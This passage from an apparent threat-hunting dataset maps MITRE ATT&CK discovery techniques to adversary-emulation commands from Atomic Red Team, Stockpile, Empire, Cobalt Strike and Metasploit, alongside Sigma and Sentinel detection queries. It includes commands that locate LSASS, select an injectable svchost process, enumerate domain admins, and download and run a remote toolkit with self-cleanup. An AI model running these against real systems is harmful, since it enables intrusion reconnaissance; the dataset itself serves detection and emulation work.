"https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nC: \\ Users \\ Administrator> net use\nIt will record a new network connection.\n\nList is empty.", "name": "Dos"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nC: \\ Users \\ Administrator> net session\nList is empty.", "name": "Dos"}], "command_list": ["netstat -ano[b] ", "shell c:\\windows\\sysnative\\netstat.exe -ano[b]", "post/windows/gather/tcpnetstat", "net session | find / \"\\\\\"", "shell net session | find / \"\\\\\"", "post/windows/gather/enum_logged_on_users", "netstat\nnet use\nnet sessions\n", "Get-NetTCPConnection\n", "netstat\nwho -a\n", {"windows": {"psh": {"command": "netstat -ano;\nGet-NetTCPConnection"}}}, {"windows": {"psh": {"command": "Get-NetTCPConnection\n"}}, "darwin": {"sh": {"command": "netstat -ant\n"}}, "linux": {"sh": {"command": "netstat -ant\n"}}}, "powershell/situational_awareness/host/monitortcpconnections", "powershell/situational_awareness/host/monitortcpconnections", "powershell/situational_awareness/network/powerview/get_rdp_session", "powershell/situational_awareness/network/powerview/get_rdp_session", "Dos\nC: \\ Users \\ Administrator> netstat\n\nActive connections\n\nProtocol local address external address status", "Dos\nC: \\ Users \\ Administrator> net use\nIt will record a new network connection.\n\nList is empty.", "Dos\nC: \\ Users \\ Administrator> net session\nList is empty."], "technique_id": "T1049", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1049", "Built-in Windows Command": "netstat -ano[b] ", "Cobalt Strike": "shell c:\\windows\\sysnative\\netstat.exe -ano[b]", "Description": "Display current TCP/IP network connections (b requires elevated privs so you can see the process that opened the connection)", "Metasploit": "post/windows/gather/tcpnetstat"}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1049", "Built-in Windows Command": "net session | find / \"\\\\\"", "Cobalt Strike": "shell net session | find / \"\\\\\"", "Description": "Display the list of active SMB sessions on the workstation so you can see which users have active connections.", "Metasploit": "post/windows/gather/enum_logged_on_users"}}, {"Atomic Red Team Test - System Network Connections Discovery": {"display_name": "System Network Connections Discovery", "atomic_tests": [{"description": "Get a listing of network connections.\n", "supported_platforms": ["windows"], "name": "System Network Connections Discovery", "executor": {"elevation_required": false, "command": "netstat\nnet use\nnet sessions\n", "name": "command_prompt"}}, {"description": "Get a listing of network connections.\n", "supported_platforms": ["windows"], "name": "System Network Connections Discovery with PowerShell", "executor": {"elevation_required": false, "command": "Get-NetTCPConnection\n", "name": "powershell"}}, {"description": "Get a listing of network connections.\n", "supported_platforms": ["linux", "macos"], "name": "System Network Connections Discovery Linux & MacOS", "executor": {"elevation_required": false, "command": "netstat\nwho -a\n", "name": "sh"}}], "attack_technique": "T1049"}}, {"Mitre Stockpile - Enumerates network connections": {"platforms": {"windows": {"psh": {"command": "netstat -ano;\nGet-NetTCPConnection"}}}, "description": "Enumerates network connections", "tactic": "discovery", "technique": {"attack_id": "T1049", "name": "System Network Connections Discovery"}, "id": "613e0ffb-e6e8-4e86-b35d-10edd232679d", "name": "System Network Connections Discovery"}}, {"Mitre Stockpile - Find System Network Connections": {"platforms": {"windows": {"psh": {"command": "Get-NetTCPConnection\n"}}, "darwin": {"sh": {"command": "netstat -ant\n"}}, "linux": {"sh": {"command": "netstat -ant\n"}}}, "description": "Find System Network Connections", "tactic": "discovery", "technique": {"attack_id": "T1049", "name": "System Network Connections Discovery"}, "id": "638fb6bb-ba39-4285-93d1-7e4775b033a8", "name": "Find System Network Connections"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1049", "Empire Module": "powershell/situational_awareness/host/monitortcpconnections", "Technique": "System Network Connections Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/host/monitortcpconnections\":  [\"T1049\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1049", "Empire Module": "powershell/situational_awareness/network/powerview/get_rdp_session", "Technique": "System Network Connections Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_rdp_session\":  [\"T1049\"],"}}], "queries": [{"query": "Sysmon| where EventID == 1 and (process_path contains \"net.exe\"or process_path contains \"netstat.exe\")and (process_command_line contains \"*net* use*\"or process_command_line contains \"*net* sessions*\"or process_command_line contains \"*net* file*\"or process_command_line contains \"*netstat*\")or process_command_line contains \"*Get-NetTCPConnection*\"", "product": "Azure Sentinel", "name": "System Network Connections Discovery"}, {"query": "Yml\ntitle: windows system network link found\ndescription: windows server 2016\nreferences:\ntags: T1049\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ NETSTAT.EXE' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ windows \\ system32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: netstat # Process information> process command line\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4703 # a user's privileges to be adjusted.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ NETSTAT.EXE' # process information> process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EnabledPrivileges: 'SeDebugPrivilege' permission enabled #\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4689 # exited process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ NETSTAT.EXE' # process information> process name\n\u00a0\u00a0\u00a0\u00a0timeframe: last 5s # can be adjusted according to actual situation\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}, {"query": "Yml\ntitle: windows system network link found\ndescription: windows server 2016\nreferences:\ntags: T1049\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ net.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ windows \\ system32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: net use # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4689 # exited process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ net.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0timeframe: last 5s # can be adjusted according to actual situation\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}, {"query": "Yml\ntitle: windows system network link found\ndescription: windows server 2016\nreferences:\ntags: T1049\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ net.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ windows \\ system32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: net session # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ net1.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ net.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: C: \\ Windows \\ system32 \\ net1 session # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4689 # exited process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ net1.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0selection4:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4689 # exited process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ net.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0timeframe: last 1m # can be adjusted according to actual situation\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "tasklist /v [/svc]\nnet start\nqprocess *", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "ps\nshell tasklist /v [/svc]\nshell net start", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "ps\npost/windows/gather/enum_services", "name": "Metasploit"}, {"source": "atomics/T1057/T1057.yaml", "command": "ps >> /tmp/loot.txt\nps aux >> /tmp/loot.txt\n", "name": null}, {"source": "atomics/T1057/T1057.yaml", "command": "tasklist\n", "name": null}, {"source": "data/abilities/collection/8adf02e8-6e71-4244-886c-98c402857404.yml", "command": {"windows": {"psh": {"command": "tasklist /m  >> $env:APPDATA\\vmtool.log;\ncat $env:APPDATA\\vmtools.log\n"}}}, "name": "Capture running processes and their loaded DLLs"}, {"source": "data/abilities/collection/cc191baa-7472-4386-a2f4-42f203f1acfd.yml", "command": {"windows": {"psh,pwsh": {"command": "$ps_url = \"https://download.sysinternals.com/files/PSTools.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"PSTools.zip\" -DestinationPath $staging_folder;\niex $staging_folder\"\\pslist.exe\" >> $env:LOCALAPPDATA\\output.log;\nRemove-Item $download_folder\"PSTools.zip\";\nRemove-Item $staging_folder -Recurse\n"}}}, "name": "Process discovery via SysInternals pstool"}, {"source": "data/abilities/discovery/0093c0e0-68b6-4cab-b0d4-2b40b3c78f71.yml", "command": {"linux": {"sh": {"parsers": {"plugins.stockpile.app.parsers.acrn": [{"source": "hypervisor.vm.name"}]}, "command": "acrnctl list\n"}}}, "name": "Enumerate running virtual machines on hypervisor"}, {"source": "data/abilities/discovery/05cda6f6-2b1b-462e-bff1-845af94343f7.yml", "command": {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.json": [{"source": "host.process.id", "json_key": "Id", "json_type": ["int"]}]}, "command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\n$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };\n$valid | ConvertTo-Json\n"}}}, "name": "Discovers processes that the current user has the ability to access and selects an injectable one"}, {"source": "data/abilities/discovery/0bff4ee7-42a4-4bde-b09a-9d79d8b9edd7.yml", "command": {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.json": [{"source": "host.process.id", "json_key": "Id", "json_type": ["int"]}]}, "command": "$ps = get-process | select processname,Id;\n$valid = foreach($p in $ps) { if($p.ProcessName -eq \"lsass\") {$p} };\n$valid | ConvertTo-Json\n"}}}, "name": "Get process info for LSASS"}, {"source": "data/abilities/discovery/3b5db901-2cb8-4df7-8043-c4628a6a5d5a.yml", "command": {"windows": {"psh": {"command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\nforeach($p in $ps) {\n    if($p.Owner -eq \"#{host.user.name}\") {\n        $p;\n    }\n}\n"}}, "darwin": {"sh": {"command": "ps aux | grep #{host.user.name}\n"}}, "linux": {"sh": {"command": "ps aux | grep #{host.user.name}\n"}}}, "name": "Get process info for processes running as a user"}, {"source": "data/abilities/discovery/5a39d7ed-45c9-4a79-b581-e5fb99e24f65.yml", "command": {"windows": {"psh": {"command": "Get-Process"}, "cmd": {"command": "tasklist"}}, "darwin": {"sh": {"command": "ps aux"}}, "linux": {"sh": {"command": "ps aux"}}}, "name": "Identify system processes"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/paranoia", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/paranoia", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/process_hunter", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/process_hunter", "name": "Empire Module Command"}], "command_list": ["tasklist /v [/svc]\nnet start\nqprocess *", "ps\nshell tasklist /v [/svc]\nshell net start", "ps\npost/windows/gather/enum_services", "ps >> /tmp/loot.txt\nps aux >> /tmp/loot.txt\n", "tasklist\n", {"windows": {"psh": {"command": "tasklist /m  >> $env:APPDATA\\vmtool.log;\ncat $env:APPDATA\\vmtools.log\n"}}}, {"windows": {"psh,pwsh": {"command": "$ps_url = \"https://download.sysinternals.com/files/PSTools.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"PSTools.zip\" -DestinationPath $staging_folder;\niex $staging_folder\"\\pslist.exe\" >> $env:LOCALAPPDATA\\output.log;\nRemove-Item $download_folder\"PSTools.zip\";\nRemove-Item $staging_folder -Recurse\n"}}}, {"linux": {"sh": {"parsers": {"plugins.stockpile.app.parsers.acrn": [{"source": "hypervisor.vm.name"}]}, "command": "acrnctl list\n"}}}, {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.json": [{"source": "host.process.id", "json_key": "Id", "json_type": ["int"]}]}, "command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\n$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };\n$valid | ConvertTo-Json\n"}}}, {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.json": [{"source": "host.process.id", "json_key": "Id", "json_type": ["int"]}]}, "command": "$ps = get-process | select processname,Id;\n$valid = foreach($p in $ps) { if($p.ProcessName -eq \"lsass\") {$p} };\n$valid | ConvertTo-Json\n"}}}, {"windows": {"psh": {"command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\nforeach($p in $ps) {\n    if($p.Owner -eq \"#{host.user.name}\") {\n        $p;\n    }\n}\n"}}, "darwin": {"sh": {"command": "ps aux | grep #{host.user.name}\n"}}, "linux": {"sh": {"command": "ps aux | grep #{host.user.name}\n"}}}, {"windows": {"psh": {"command": "Get-Process"}, "cmd": {"command": "tasklist"}}, "darwin": {"sh": {"command": "ps aux"}}, "linux": {"sh": {"command": "ps aux"}}}, "powershell/situational_awareness/host/paranoia", "powershell/situational_awareness/host/paranoia", "powershell/situational_awareness/network/powerview/process_hunter", "powershell/situational_awareness/network/powerview/process_hunter"], "technique_id": "T1057", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1057", "Built-in Windows Command": "tasklist /v [/svc]\nnet start\nqprocess *", "Cobalt Strike": "ps\nshell tasklist /v [/svc]\nshell net start", "Description": "Display list of currently running processes and services on the system", "Metasploit": "ps\npost/windows/gather/enum_services"}}, {"Atomic Red Team Test - Process Discovery": {"display_name": "Process Discovery", "atomic_tests": [{"description": "Utilize ps to identify processes\n", "supported_platforms": ["macos", "linux"], "name": "Process Discovery - ps", "input_arguments": {"output_file": {"default": "/tmp/loot.txt", "type": "path", "description": "path of output file"}}, "executor": {"elevation_required": false, "command": "ps >> #{output_file}\nps aux >> #{output_file}\n", "name": "sh"}}, {"description": "Utilize tasklist to identify processes\n", "supported_platforms": ["windows"], "name": "Process Discovery - tasklist", "executor": {"elevation_required": false, "command": "tasklist\n", "name": "command_prompt"}}], "attack_technique": "T1057"}}, {"Mitre Stockpile - Capture running processes and their loaded DLLs": {"platforms": {"windows": {"psh": {"command": "tasklist /m  >> $env:APPDATA\\vmtool.log;\ncat $env:APPDATA\\vmtools.log\n"}}}, "description": "Capture running processes and their loaded DLLs", "tactic": "collection", "technique": {"attack_id": "T1057", "name": "Process Discovery"}, "id": "8adf02e8-6e71-4244-886c-98c402857404", "name": "tasklist Process Enumeration"}}, {"Mitre Stockpile - Process discovery via SysInternals pstool": {"platforms": {"windows": {"psh,pwsh": {"command": "$ps_url = \"https://download.sysinternals.com/files/PSTools.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"PSTools.zip\" -DestinationPath $staging_folder;\niex $staging_folder\"\\pslist.exe\" >> $env:LOCALAPPDATA\\output.log;\nRemove-Item $download_folder\"PSTools.zip\";\nRemove-Item $staging_folder -Recurse\n"}}}, "description": "Process discovery via SysInternals pstool", "tactic": "collection", "technique": {"attack_id": "T1057", "name": "Process Discovery"}, "id": "cc191baa-7472-4386-a2f4-42f203f1acfd", "name": "SysInternals PSTool Process Discovery"}}, {"Mitre Stockpile - Enumerate running virtual machines on hypervisor": {"platforms": {"linux": {"sh": {"parsers": {"plugins.stockpile.app.parsers.acrn": [{"source": "hypervisor.vm.name"}]}, "command": "acrnctl list\n"}}}, "description": "Enumerate running virtual machines on hypervisor", "tactic": "discovery", "technique": {"attack_id": "T1057", "name": "Process Discovery"}, "id": "0093c0e0-68b6-4cab-b0d4-2b40b3c78f71", "name": "enumerate VMs"}}, {"Mitre Stockpile - Discovers processes that the current user has the ability to access and selects an injectable one": {"platforms": {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.json": [{"source": "host.process.id", "json_key": "Id", "json_type": ["int"]}]}, "command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\n$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };\n$valid | ConvertTo-Json\n"}}}, "description": "Discovers processes that the current user has the ability to access and selects an injectable one", "tactic": "discovery", "technique": {"attack_id": "T1057", "name": "Process Discovery"}, "id": "05cda6f6-2b1b-462e-bff1-845af94343f7", "name": "Discover injectable process"}}, {"Mitre Stockpile - Get process info for LSASS": {"platforms": {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.json": [{"source": "host.process.id", "json_key": "Id", "json_type": ["int"]}]}, "command": "$ps = get-process | select processname,Id;\n$valid = foreach($p in $ps) { if($p.ProcessName -eq \"lsass\") {$p} };\n$valid | ConvertTo-Json\n"}}}, "description": "Get process info for LSASS", "tactic": "discovery", "technique": {"attack_id": "T1057", "name": "Process Discovery"}, "id": "0bff4ee7-42a4-4bde-b09a-9d79d8b9edd7", "name": "Find LSASS"}}, {"Mitre Stockpile - Get process info for processes running as a user": {"platforms": {"windows": {"psh": {"command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\nforeach($p in $ps) {\n    if($p.Owner -eq \"#{host.user.name}\") {\n        $p;\n    }\n}\n"}}, "darwin": {"sh": {"command": "ps aux | grep #{host.user.name}\n"}}, "linux": {"sh": {"command": "ps aux | grep #{host.user.name}\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.user.name"}]}], "description": "Get process info for processes running as a user", "tactic": "discovery", "technique": {"attack_id": "T1057", "name": "Process Discovery"}, "id": "3b5db901-2cb8-4df7-8043-c4628a6a5d5a", "name": "Find user processes"}}, {"Mitre Stockpile - Identify system processes": {"platforms": {"windows": {"psh": {"command": "Get-Process"}, "cmd": {"command": "tasklist"}}, "darwin": {"sh": {"command": "ps aux"}}, "linux": {"sh": {"command": "ps aux"}}}, "description": "Identify system processes", "tactic": "discovery", "technique": {"attack_id": "T1057", "name": "Process Discovery"}, "id": "5a39d7ed-45c9-4a79-b581-e5fb99e24f65", "name": "System processes"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1057", "Empire Module": "powershell/situational_awareness/host/paranoia", "Technique": "Process Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/host/paranoia\":  [\"T1057\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1057", "Empire Module": "powershell/situational_awareness/network/powerview/process_hunter", "Technique": "Process Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/process_hunter\":  [\"T1057\"],"}}], "queries": [{"query": "Sysmon| where EventID == 1 and process_path contains \"tasklist.exe\"or process_command_line contains \"Get-Process\"", "product": "Azure Sentinel", "name": "Process Discovery"}, {"query": "Yml\ntitle: windows executed locally Tasklist\ndescription: windows server 2016\nreferences: No\ntags: T1057\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # Process Creation\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ windows \\ system32 \\ tasklist.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ windows \\ system32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: tasklist # Process information> process command line\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: low", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net localgroup \"Administrators\"", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell net localgroup \"Administrators\"", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "post/windows/gather/local_admin_search_enum", "name": "Metasploit"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net group [\"Domain Admins\"] /domain[:DOMAIN] ", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net group [\"Domain Admins\"] /domain", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "domain_list_gen.rb\npost/windows/gather/enum_domain_group_users", "name": "Metasploit"}, {"source": "atomics/T1069/T1069.yaml", "command": "dscacheutil -q group\ndscl . -list /Groups\ngroups\n", "name": null}, {"source": "atomics/T1069/T1069.yaml", "command": "net localgroup\nnet group /domain\nnet group \"domain admins\" /domain\n", "name": null}, {"source": "atomics/T1069/T1069.yaml", "command": "get-localgroup\nget-ADPrincipalGroupMembership administrator | select name\n", "name": null}, {"source": "atomics/T1069/T1069.yaml", "command": "net group /domai \"Domain Admins\"\nnet groups \"Account Operators\" /doma\nnet groups \"Exchange Organization Management\" /doma\nnet group \"BUILTIN\\Backup Operators\" /doma\n", "name": null}, {"source": "data/abilities/discovery/5c4dd985-89e3-4590-9b57-71fed66ff4e2.yml", "command": {"windows": {"psh": {"command": "gpresult /R\n"}}, "darwin": {"sh": {"command": "groups"}}, "linux": {"sh": {"command": "groups"}}}, "name": "Summary of permission and security groups"}, {"source": "data/abilities/discovery/feaced8f-f43f-452a-9500-a5219488abb8.yml", "command": {"windows": {"psh": {"command": "Get-WmiObject -Class Win32_UserAccount\n"}}, "darwin": {"sh": {"command": "dscl . list /Users | grep -v '_'\n"}}}, "name": "Identify all local users"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/get_pathacl", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/get_pathacl", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_object_acl", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_object_acl", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/map_domain_trust", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/map_domain_trust", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/get_uaclevel", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/get_uaclevel", "name": "Empire Module Command"}], "command_list": ["net localgroup \"Administrators\"", "shell net localgroup \"Administrators\"", "post/windows/gather/local_admin_search_enum", "net group [\"Domain Admins\"] /domain[:DOMAIN] ", "net group [\"Domain Admins\"] /domain", "domain_list_gen.rb\npost/windows/gather/enum_domain_group_users", "dscacheutil -q group\ndscl . -list /Groups\ngroups\n", "net localgroup\nnet group /domain\nnet group \"domain admins\" /domain\n", "get-localgroup\nget-ADPrincipalGroupMembership administrator | select name\n", "net group /domai \"Domain Admins\"\nnet groups \"Account Operators\" /doma\nnet groups \"Exchange Organization Management\" /doma\nnet group \"BUILTIN\\Backup Operators\" /doma\n", {"windows": {"psh": {"command": "gpresult /R\n"}}, "darwin": {"sh": {"command": "groups"}}, "linux": {"sh": {"command": "groups"}}}, {"windows": {"psh": {"command": "Get-WmiObject -Class Win32_UserAccount\n"}}, "darwin": {"sh": {"command": "dscl . list /Users | grep -v '_'\n"}}}, "powershell/situational_awareness/host/get_pathacl", "powershell/situational_awareness/host/get_pathacl", "powershell/situational_awareness/network/powerview/get_object_acl", "powershell/situational_awareness/network/powerview/get_object_acl", "powershell/situational_awareness/network/powerview/map_domain_trust", "powershell/situational_awareness/network/powerview/map_domain_trust", "powershell/situational_awareness/host/get_uaclevel", "powershell/situational_awareness/host/get_uaclevel"], "technique_id": "T1069", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1069", "Built-in Windows Command": "net localgroup \"Administrators\"", "Cobalt Strike": "shell net localgroup \"Administrators\"", "Description": "Display the list of local administrator accounts on the workstation ", "Metasploit": "post/windows/gather/local_admin_search_enum"}}, {"Mitre APT3 Adversary 